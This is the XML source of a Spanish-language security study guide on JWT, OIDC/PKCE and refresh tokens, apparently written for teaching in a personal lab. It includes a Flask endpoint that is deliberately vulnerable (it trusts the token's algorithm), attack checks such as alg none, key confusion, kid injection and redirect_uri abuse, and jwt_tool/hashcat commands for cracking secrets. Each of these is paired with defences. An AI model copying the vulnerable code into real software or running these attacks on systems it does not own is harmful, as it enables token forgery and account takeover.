        <w:t>token = jwt.encode({"sub": "123", "scope": "read", "iss": "https://mi-lab"}, "secreto", algorithm="HS256")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(token)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(jwt.decode(token, "secreto", algorithms=["HS256"]))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Decodificá el payload </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sin verificar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para ver que base64 no oculta nada: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python -c "import base64,sys; p=sys.argv[1].split('.')[1]; print(base64.urlsafe_b64decode(p+'='*(-len(p)%4)).decode())" eyJ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas (en laboratorio propio)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Montá un lab minúsculo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Flask) que acepte JWT, para probar los clásicos sin tocar a nadie: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# lab_jwt.py  -&gt;  flask run  (sólo local)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from flask import Flask, request, jsonify</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>app = Flask(__name__)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/perfil")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def perfil():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    tok = request.headers.get("Authorization", "").replace("Bearer ", "")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        # ATAJO VULNERABLE A PROPÓSITO: confía en el alg del token y usa la clave como secreto</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        data = jwt.decode(tok, "secreto", algorithms=None, options={"verify_signature": True})</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        return jsonify(data)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        return str(e), 401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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Ataque</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (contra EL LAB de arriba)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>alg: none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Generá un token con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{"alg":"none"}</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> y sin firma; si el servidor lo acepta, es vulnerable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Confusión RS256→HS256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Si el server verifica con clave pública, intentá firmar con HS256 usando esa clave pública como secreto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>kid</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> injection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Enviá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kid</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> apuntando a un archivo/ruta conocida; observá si cambia la clave usada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Secreto débil (HS256)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Crackeá </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>tu propio</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> token con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hashcat</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/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jwt_tool</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> y un diccionario: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jwt_tool eyJ... -C -d rockyou.txt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Sin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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0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aud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Generá un token sin expiración o con otra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aud</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> y probá si el endpoint lo acepta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Firma no verificada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Cambiá un byte del payload sin refirmar; si pasa, no verifica firma</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jwt_tool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (todo contra tu lab):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git clone https://github.com/ticarpi/jwt_tool</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python3 jwt_tool.py eyJ... -M at      # prueba alg none</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python3 jwt_tool.py eyJ... -C -d wordlist.txt   # crackea el secreto</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>desde la configuración del validador</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, nunca del token; verificar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iss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aud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exp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nbf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; claves fuertes; rotación de claves (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>kid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> correcto); validar contra JWKS; y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 8725 (febrero 2020)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:hyperlink r:id="rId20">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP JWT Cheat Sheet</w:t>
        </w:r>
      </w:hyperlink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M7 — OIDC, authorization code, PKCE e ID token (2014)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2786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oauth_flow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7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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Flujos de OAuth 2.0: cuáles usar y cuáles se retiraron</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OpenID Connect Core 1.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, final aprobado el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>26 de febrero de 2014</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, es la capa de identidad sobre OAuth 2.0. Flujo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>authorization code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 6749 §4.1 (2012)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, código de un solo uso (si se reutiliza, la norma exige denegar y revocar, §4.1.2). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>PKCE: RFC 7636, agosto de 2015.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> El </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ID token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es un JWT que dice </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>quién</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es la persona y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>cómo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se autenticó (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>auth_time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amr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acr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no sirve para acceder a recursos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Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"El authorization code es el cupón de un solo uso que cambia un artefacto público —lo que viaja por el navegador— por uno privado. PKCE le agrega un candado: aunque te roben el código, no lo podés canjear sin el verificador. Y el ID token es el DNI que te muestran en la puerta, no el pase que te ponen en la muñeca para entrar al recinto."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer (flujo, sin llamar a sistemas de terceros)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Con tu propio lab (Keycloak local, o el proyecto de práctica):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1) /authorize?response_type=code&amp;client_id=lab&amp;redirect_uri=http://localhost/cb</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">   &amp;scope=openid&amp;state=RANDOM&amp;code_challenge=...&amp;code_challenge_method=S256</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>2) el usuario (vos) se autentica en el lab</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>3) /cb?code=XXXX&amp;state=RANDOM</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>4) POST /token  code=XXXX + code_verifier=...  -&gt; access_token, id_token, refresh_token</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Decodificá el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>id_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> localmente y mirá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iss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aud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auth_time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amr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nonce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Vulnerabilidades y cómo comprobarlas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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (lab propio / tu integración)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Sin PKCE → código interceptable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Repetí el flujo </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>de tu lab</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> sin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code_challenge</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> e intentá canjear el código con otro cliente</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>redirect_uri</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> laxa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En tu lab, probá un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redirect_uri</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> no registrado (p. ej. un subpath o dominio parecido)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Falta de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state</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> → CSRF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Iniciá el login y manipulá/eliminá el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state</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>: ¿acepta la respuesta?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Falta de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nonce</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> → replay del ID token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Reutilizá un ID token viejo en tu cliente y verificá si valida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nonce</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/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auth_time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/>
              </w:rPr>
              <w:t>Mix-up attack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En lab con dos IdP, cruzá respuestas entre proveedores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ID token usado como access token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Probá mandar el ID token al endpoint de recursos de tu lab: debe rechazarse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Rate-limit en login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Enviá N intentos de tu usuario de práctica y medí bloqueo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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">PKCE obligatorio (lo exige </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 9700</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>redirect_uri</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> exacta, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>state</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>nonce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, validar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iss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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>aud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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>exp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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>nonce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en el RP, no usar el ID token como access token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M8 — Refresh token (2012)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72754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lifecyc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27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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Ciclo de vida de un token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Token de vida larga que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sólo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se usa contra el endpoint de token para obtener nuevos access tokens. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 6749 §§1.5 y 6 (octubre de 2012)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; rotación sugerida en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>§10.4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 9700 (enero de 2025)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la exige para clientes públicos. Revocación: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 7009, octubre de 2013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Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"El access token es el boleto de la función; el refresh token es la acreditación que te deja pedir uno nuevo sin volver a la taquilla. La rotación convierte al refresh en un artefacto de un solo uso: si un atacante lo usa, el legítimo lo delata."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">En tu lab: guardá el refresh token, pedí un access token nuevo y observá si el refresh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cambia</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (rotación) y si el viejo queda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>inválido</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (detección de reuso).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (lab/tu integración)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Sin rotación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Reutilizá el mismo refresh token dos veces: si ambas funcionan, no hay rotación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Sin detección de reuso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Usá el refresh viejo después de rotar: si sigue vivo, no hay detección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Vida infinita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Verificá si hay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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> o política de caducidad absoluta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Almacenamiento inseguro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En tu app, buscá el refresh en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localStorage</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
